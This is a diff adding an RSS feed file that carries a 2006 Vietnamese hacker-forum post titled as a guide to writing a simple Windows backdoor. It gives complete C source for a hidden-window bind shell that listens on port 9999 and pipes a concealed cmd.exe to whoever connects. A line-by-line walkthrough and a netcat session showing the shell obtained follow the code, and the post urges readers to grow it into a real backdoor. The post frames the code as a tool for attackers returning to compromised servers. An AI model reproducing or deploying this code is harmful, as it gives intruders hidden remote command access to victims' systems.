@@ -1,0 +1,326 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Hướng dẫn viết một backdoor đơn giản trên Windows"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Hướng dẫn viết một backdoor đơn giản trên Windows"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Hướng dẫn viết một backdoor đơn giản trên Windows</title>
+				<description><![CDATA[ Nguyên tắc là cách làm việc của backdoor không giải thích các bạn cũng biết nó gì và cách sử dụng chúng như nào. Một khi backdoor được cài lên giúp kẻ tấn công sẽ thuận tiện hơn khi trở lại server mà mình đã tấn công vào, điều mà chúng ta cần biết là cách viết đổ cmd.exe tử backdoor (tức là kẻ tấn công có shell khi đã có backdoor được cài trên server) như thế nào ?
+
+Đoạn mã viết dưới đây không phải là backdoor mà chỉ đơn thuần là một phần công việc của backdoor. Sau đây mình sẽ hướng dẫn cách viết đổ cmd.exe như thế nào ?
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#define PORT 9999	//&lt;--Dat cong lang nghe la 9999
+#define BANNER	"Seamoun &#40;http://nhomvicki.net&#41; - TcpShell 1.0\n"
+#define	MAXRECVBUF	1000	//Bo dem toi da khi nhan
+#define MAXPIPEBUF	1000	//Bo dem toi da cua pipe
+#define WM_SHELL	WM_USER+1	//Tinh huong tu dinh nghia
+
+#define	MyClass	"Seamoun"	//Ten lop
+#define MyApp	"Seamoun"	//Ten ung dung
+
+#pragma comment&#40;lib,"wsock32.lib"&#41;	//Gop thu vien wsock32.lib
+
+
+HANDLE	hThread_out;	
+DWORD	dwChildThreadIdOut;
+SECURITY_ATTRIBUTES	sa;	
+STARTUPINFO	si;
+PROCESS_INFORMATION pi;
+HANDLE	hPipeOutputRead,hPipeOutputWrite,hPipeInputRead,hPipeInputWrite;
+BOOL	NowUsing;
+
+int	sock_listen,sock;
+sockaddr_in	addrServer;
+
+
+void GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;;
+int	WndProc&#40;HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam&#41;;
+DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;;
+
+int	__stdcall WinMain&#40;HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd&#41;
+{
+	HWND hwnd;
+	MSG	 msg;
+
+	WNDCLASSEX wc;
+	wc.cbClsExtra=0;
+	wc.cbSize=sizeof&#40;wc&#41;;
+	wc.cbWndExtra=0;
+	wc.hbrBackground=&#40;HBRUSH&#41;COLOR_WINDOW;
+	wc.hCursor=LoadCursor&#40;NULL,IDC_ARROW&#41;;
+	wc.hIcon=LoadIcon&#40;NULL,IDI_APPLICATION&#41;;
+	wc.hIconSm=0;
+	wc.hInstance=hInstance;
+	wc.lpfnWndProc=&#40;WNDPROC&#41;WndProc;
+	wc.lpszClassName=MyClass;
+	wc.lpszMenuName=0;
+	wc.style=CS_HREDRAW|CS_VREDRAW;
+
+	RegisterClassEx&#40;&wc&#41;;
+	hwnd=CreateWindowEx&#40;NULL,MyClass,MyApp,WS_OVERLAPPEDWINDOW,0,0,0,0,NULL,NULL,hInstance,NULL&#41;;
+	ShowWindow&#40;hwnd,SW_HIDE&#41;;
+	UpdateWindow&#40;hwnd&#41;;
+
+	while &#40;GetMessage&#40;&msg,0,0,0&#41;&#41;
+	{
+		TranslateMessage&#40;&msg&#41;;
+		DispatchMessage&#40;&msg&#41;;
+	}
+
+	return msg.wParam;
+}
+
+int	WndProc&#40;HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam&#41;
+{
+	WSADATA	wsaData;
+	switch&#40;msg&#41;
+	{
+	case WM_CREATE:
+		if &#40;WSAStartup&#40;MAKEWORD&#40;1,1&#41;,&wsaData&#41;!=0&#41; return -1;
+		if &#40;&#40;sock_listen=socket&#40;AF_INET,SOCK_STREAM,0&#41;&#41;==INVALID_SOCKET&#41; return -1;
+		
+		addrServer.sin_family=AF_INET;
+		addrServer.sin_port=htons&#40;PORT&#41;;
+		addrServer.sin_addr.s_addr=htonl&#40;INADDR_ANY&#41;;
+		memset&#40;&addrServer.sin_zero,'\0',8&#41;;
+		if &#40;bind&#40;sock_listen,&#40;struct sockaddr *&#41;&addrServer,sizeof&#40;addrServer&#41;&#41;==SOCKET_ERROR&#41; return -1;
+		if &#40;listen&#40;sock_listen,1&#41;==SOCKET_ERROR&#41; return -1;
+		if &#40;WSAAsyncSelect&#40;sock_listen,hwnd,WM_SHELL,
+			FD_CLOSE|FD_ACCEPT|FD_READ|FD_WRITE&#41;==SOCKET_ERROR&#41; return -1;
+		NowUsing=FALSE;
+		break;
+	case WM_CLOSE:
+		PostQuitMessage&#40;wParam&#41;;
+		break;
+	case WM_SHELL:
+		GetShell&#40;hwnd,wParam,lParam&#41;;
+	default:
+		return &#40;DefWindowProc&#40;hwnd,msg,wParam,lParam&#41;&#41;;
+	}
+	return 0;
+}
+void GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;
+{
+	long lEvent=WSAGETSELECTEVENT&#40;lParam&#41;;
+	static char buf&#91;MAXRECVBUF&#93;;
+	DWORD	dwNumberOfBytesWrite;
+	int	sock_tmp;
+	UINT	r;
+	sockaddr_in	addrClient;
+	int	sizeClient=sizeof&#40;addrClient&#41;;
+	if &#40;lEvent==FD_ACCEPT&#41;
+	{
+		if &#40;&#40;sock_tmp=accept&#40;sock_listen,&#40;struct sockaddr *&#41;&addrClient,&sizeClient&#41;&#41;==INVALID_SOCKET&#41; 
+			 if &#40;WSAGetLastError&#40;&#41;!=WSAEWOULDBLOCK&#41; return;
+		
+		if &#40;NowUsing==TRUE&#41;
+		{
+			closesocket&#40;sock_tmp&#41;;
+			return;
+		}
+		sock=sock_tmp;
+		send&#40;sock,BANNER,strlen&#40;BANNER&#41;,0&#41;;
+		NowUsing=TRUE;
+
+		sa.nLength=sizeof&#40;sa&#41;;
+		sa.lpSecurityDescriptor=0;
+		sa.bInheritHandle=TRUE;
+
+		CreatePipe&#40;&hPipeOutputRead,&hPipeOutputWrite,&sa,5000&#41;;
+		CreatePipe&#40;&hPipeInputRead,&hPipeInputWrite,&sa,5000&#41;;
+
+		memset&#40;&#40;void *&#41;&si,'\0',sizeof&#40;si&#41;&#41;;
+		memset&#40;&#40;void *&#41;&pi,'\0',sizeof&#40;pi&#41;&#41;;
+
+		si.cb=sizeof&#40;si&#41;;
+		si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
+		si.wShowWindow=SW_HIDE;
+		si.hStdInput=hPipeInputRead;
+		si.hStdOutput=hPipeOutputWrite;
+		si.hStdError=hPipeOutputWrite;
+
+		CreateProcess&#40;NULL,TEXT&#40;"cmd.exe"&#41;,NULL,NULL,TRUE,0,NULL,TEXT&#40;"c:\\"&#41;,&si,&pi&#41;;
+
+		CloseHandle&#40;hPipeInputRead&#41;;
+		CloseHandle&#40;hPipeOutputWrite&#41;;
+
+		hThread_out=CreateThread&#40;NULL,0,OutSocket,NULL,NULL,&dwChildThreadIdOut&#41;;
+		return;
+	}
+	else if &#40;lEvent==FD_CLOSE&#41;
+	{
+		closesocket&#40;sock&#41;;
+		TerminateProcess&#40;pi.hProcess,0&#41;;
+		TerminateThread&#40;hThread_out,0&#41;;
+		CloseHandle&#40;pi.hProcess&#41;;
+		CloseHandle&#40;hPipeOutputRead&#41;;
+		CloseHandle&#40;hPipeInputWrite&#41;;
+		NowUsing=FALSE;
+	}
+	if &#40;&#40;r=recv&#40;sock,buf,MAXRECVBUF,0&#41;&#41;==SOCKET_ERROR&#41; return;
+	buf&#91;r&#93;=0;
+	WriteFile&#40;hPipeInputWrite,&buf,r,&dwNumberOfBytesWrite,NULL&#41;;
+}
+DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;
+{
+	char szBuffer&#91;MAXPIPEBUF&#93;;
+	DWORD	dwNumberOfBytesRead;
+	for &#40;;;&#41;
+	{
+		if &#40;ReadFile&#40;hPipeOutputRead,&szBuffer,MAXPIPEBUF,&dwNumberOfBytesRead,NULL&#41;==FALSE&#41; continue;
+		if &#40;dwNumberOfBytesRead&lt;=0&#41; continue;
+		FlushFileBuffers&#40;hPipeOutputRead&#41;;
+		szBuffer&#91;dwNumberOfBytesRead&#93;=0;
+		send&#40;sock,szBuffer,dwNumberOfBytesRead,0&#41;;
+	}
+	return 0;
+}</pre>
+		</div>
+
+Với đoan mã trên thì phần đăng kí và tạo ra window thì đơn giản, các bạn có thể tham khảo cách lập trình C trên Windows. Để khỏi dài dòng mình chỉ nói phần đổ cmd.exe như thế nào mà thôi !
+1) Trong tình huống WM_CREATE (tức là khi đang tạo Windows) chúng ta có đoạn mã sau:
+	
+	<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>if &#40;WSAStartup&#40;MAKEWORD&#40;1,1&#41;,&wsaData&#41;!=0&#41; return -1;//&lt;-- Khởi tạo thư viện winsocket
+	if &#40;&#40;sock_listen=socket&#40;AF_INET,SOCK_STREAM,0&#41;&#41;==INVALID_SOCKET&#41; return -1; //&lt;--Tạo socket listen
+	//Định nghĩa giá trị cho biến cấu trúc sockaddr_in addrServer
+	addrServer.sin_family=AF_INET;	
+	addrServer.sin_port=htons&#40;PORT&#41;;
+	addrServer.sin_addr.s_addr=htonl&#40;INADDR_ANY&#41;;
+	memset&#40;&addrServer.sin_zero,'\0',8&#41;;
+	//--------------------------------------------------------------------
+	if &#40;bind&#40;sock_listen,&#40;struct sockaddr *&#41;&addrServer,sizeof&#40;addrServer&#41;&#41;==SOCKET_ERROR&#41; return -1;//Bind socket listen
+	if &#40;listen&#40;sock_listen,1&#41;==SOCKET_ERROR&#41; return -1;	//&lt;-- Đặt chế độ lắng nghe
+
+	//Tạo những tình huống riêng &#40;ở đây mình lấy tên tình huống riêng là WM_SHELL các bạn có thể lấy tên khác tùy ý miễn là nó được định nghĩa WM_USER +x&#41;
+	if &#40;WSAAsyncSelect&#40;sock_listen,hwnd,WM_SHELL,
+		FD_CLOSE|FD_ACCEPT|FD_READ|FD_WRITE&#41;==SOCKET_ERROR&#41; return -1;
+
+	NowUsing=FALSE;	//&lt;--Đây đơn giản là biến dùng để đánh dấu socket đang dùng hay là không dùng nữa</pre>
+		</div>
+2) Giải thích mã của hai hàm GetShell và OutSocket
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>a&#41; Hàm GetShell &#40;HWND hwnd,WPARAM wParam,LPARAM lParam&#41;
+	long lEvent=WSAGETSELECTEVENT&#40;lParam&#41;;	//&lt;--Lấy sự kiện
+	static char buf&#91;MAXRECVBUF&#93;;	//Khai báo biến buf để
+	DWORD	dwNumberOfBytesWrite;	//
+	int	sock_tmp;	//&lt;--Khai báo một socket trung gian
+	UINT	r;
+	sockaddr_in	addrClient;
+	int	sizeClient=sizeof&#40;addrClient&#41;;
+	//Khi có kết nối đến từ máy client - Ở đây kết nối được chấp nhận và sử lý như sau
+	if &#40;lEvent==FD_ACCEPT&#41;
+	{
+		if &#40;&#40;sock_tmp=accept&#40;sock_listen,&#40;struct sockaddr *&#41;&addrClient,&sizeClient&#41;&#41;==INVALID_SOCKET&#41; 
+			 if &#40;WSAGetLastError&#40;&#41;!=WSAEWOULDBLOCK&#41; return;
+
+		//Nếu như đang sử dụng thì đóng socket này lại	
+		if &#40;NowUsing==TRUE&#41;
+		{
+			closesocket&#40;sock_tmp&#41;;
+			return;
+		}
+		
+		sock=sock_tmp;
+		send&#40;sock,BANNER,strlen&#40;BANNER&#41;,0&#41;;
+		NowUsing=TRUE;
+
+		sa.nLength=sizeof&#40;sa&#41;;
+		sa.lpSecurityDescriptor=0;
+		sa.bInheritHandle=TRUE;
+		
+		//Tạo hai ống dẫn dùng để đổ cmd.exe. Một ống dùng để nhận lệnh từ client gửi đến và một ống dùng để xuất kết quả trả về cho client
+
+		CreatePipe&#40;&hPipeOutputRead,&hPipeOutputWrite,&sa,5000&#41;;
+		CreatePipe&#40;&hPipeInputRead,&hPipeInputWrite,&sa,5000&#41;;
+
+		memset&#40;&#40;void *&#41;&si,'\0',sizeof&#40;si&#41;&#41;;
+		memset&#40;&#40;void *&#41;&pi,'\0',sizeof&#40;pi&#41;&#41;;
+		//Khởi tạo một số thông số cho biến cấu trúc si &#40;Startup Information: thông tin khởi động&#41;
+		si.cb=sizeof&#40;si&#41;;
+		si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
+		si.wShowWindow=SW_HIDE;
+		si.hStdInput=hPipeInputRead;
+		si.hStdOutput=hPipeOutputWrite;
+		si.hStdError=hPipeOutputWrite;
+
+//Tạo một tiến trình mới. Mà ở đây là chạy cmd.exe		CreateProcess&#40;NULL,TEXT&#40;"cmd.exe"&#41;,NULL,NULL,TRUE,0,NULL,TEXT&#40;"c:\\"&#41;,&si,&pi&#41;;
+
+		CloseHandle&#40;hPipeInputRead&#41;;
+		CloseHandle&#40;hPipeOutputWrite&#41;;
+		//Tạo luồng trong tiến trình mới với mục đích là đọc ghi dữ liệu
+		hThread_out=CreateThread&#40;NULL,0,OutSocket,NULL,NULL,&dwChildThreadIdOut&#41;;
+		return;
+	}
+	else if &#40;lEvent==FD_CLOSE&#41;
+	{
+	//Đóng tất các các handle khi xuất hiện tình huống FD_CLOSE
+		closesocket&#40;sock&#41;;
+		TerminateProcess&#40;pi.hProcess,0&#41;;
+		TerminateThread&#40;hThread_out,0&#41;;
+		CloseHandle&#40;pi.hProcess&#41;;
+		CloseHandle&#40;hPipeOutputRead&#41;;
+		CloseHandle&#40;hPipeInputWrite&#41;;
+		NowUsing=FALSE;
+	}
+	if &#40;&#40;r=recv&#40;sock,buf,MAXRECVBUF,0&#41;&#41;==SOCKET_ERROR&#41; return;
+	buf&#91;r&#93;=0;
+	//Nhận dữ liệu từ client và ghi đến CMD.EXE
+	WriteFile&#40;hPipeInputWrite,&buf,r,&dwNumberOfBytesWrite,NULL&#41;;
+}</pre>
+		</div>
+3) Giải thích mã hàm OutSocket
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>DWORD	__stdcall OutSocket&#40;LPVOID lpData&#41;
+{
+	char szBuffer&#91;MAXPIPEBUF&#93;;
+	DWORD	dwNumberOfBytesRead;
+	//Tạo vòng lặp vô tận để nhận kết quả trả về từ CMD.EXE
+	for &#40;;;&#41;
+	{
+		if &#40;ReadFile&#40;hPipeOutputRead,&szBuffer,MAXPIPEBUF,&dwNumberOfBytesRead,NULL&#41;==FALSE&#41; continue;
+		if &#40;dwNumberOfBytesRead&lt;=0&#41; continue;
+		FlushFileBuffers&#40;hPipeOutputRead&#41;;
+		szBuffer&#91;dwNumberOfBytesRead&#93;=0;	//&lt;-- Thêm kí tự kết thúc chuỗi trong dữ liệu trả về
+		//Hiển thị kết quả CMD.EXE trả về ra màn hình client
+		send&#40;sock,szBuffer,dwNumberOfBytesRead,0&#41;;
+	}
+	return 0;
+}</pre>
+		</div>
+
+Biên dịch đoạn mã trên và thực thi nó sẽ có kết quả như sau:
+tcpshell sẽ lắng nghe trên cổng 9999. Chúng ta kết nối đến cổng 9999 bằng netcat để xem tcpshell đổ cmd.exe như thế nào
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>d:\&gt;nx -vv -n 10.0.0.1 9999
+&#40;UNKNOWN&#41; &#91;10.0.0.1&#93; 9999 &#40;?&#41; open
+Seamoun &#40;http://nhomvicki.net&#41; - TcpShell 1.0
+Microsoft Windows 2000 &#91;Version 5.00.2195&#93;
+&#40;C&#41; Copyright 1985-2000 Microsoft Corp.
+
+c:\&gt;	&lt;--- Vậy là đã có shell</pre>
+		</div>
+
+Sau bài này các bạn có thể phát triển tiếp cho mã trên trở thành một con backdoor thực sự !
+
+Bài này mình viết lâu roài. Đã post lên HVA rồi mà hổng biết sao tìm hổng thấy bài này nên mình post lại  8)) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/5516.hva#32372</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/5516.hva#32372</link>
+				<pubDate><![CDATA[Sat, 23 Dec 2006 13:17:51]]> GMT</pubDate>
+				<author><![CDATA[ seamoun]]></author>
+			</item>
+	</channel>
+</rss>
